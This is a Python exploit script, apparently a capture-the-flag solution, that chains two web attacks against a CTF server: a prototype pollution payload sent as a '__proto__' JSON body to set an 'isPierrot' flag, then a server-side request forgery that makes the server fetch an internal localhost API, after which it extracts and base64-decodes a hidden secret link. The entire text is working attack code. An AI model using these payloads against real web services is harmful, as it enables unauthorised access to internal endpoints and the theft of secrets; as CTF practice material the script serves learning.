import requests
import re
import base64

BASE_URL = "http://instance.ctf.it.kmitl.ac.th:5173"

def main():
    print("[*] Stage 1: Targeting Prototype Pollution (isPierrot = true)")
    requests.post(f"{BASE_URL}/api/v1/update-runner-status", json={
        "__proto__": {"isPierrot": True}
    })

    
    print("[*] Stage 2: SSRF targeting internal Localhost API")
    res = requests.post(f"{BASE_URL}/api/v1/export-ban-report", json={
        "url": "http://127.0.0.1:3000/api/v1/internal/secret-link"
    })
    
    data = res.json()
    content = data.get("content", "")
    
    # ใช้ Regex ดึง Base64 จาก JSON หน้าเว็บที่ Puppeteer ดึงมา
    secret_match = re.search(r'"secret"\s*:\s*"([^"]+)"', content)
    if secret_match:
        secret_b64 = secret_match.group(1)
        url = base64.b64decode(secret_b64).decode()
        print("\n[+] Success! Hidden Google Drive Link Found:")
        print(f"    --> {url}")
    else:
        print("[-] Secret link not found, try again.")

if __name__ == "__main__":
    main()
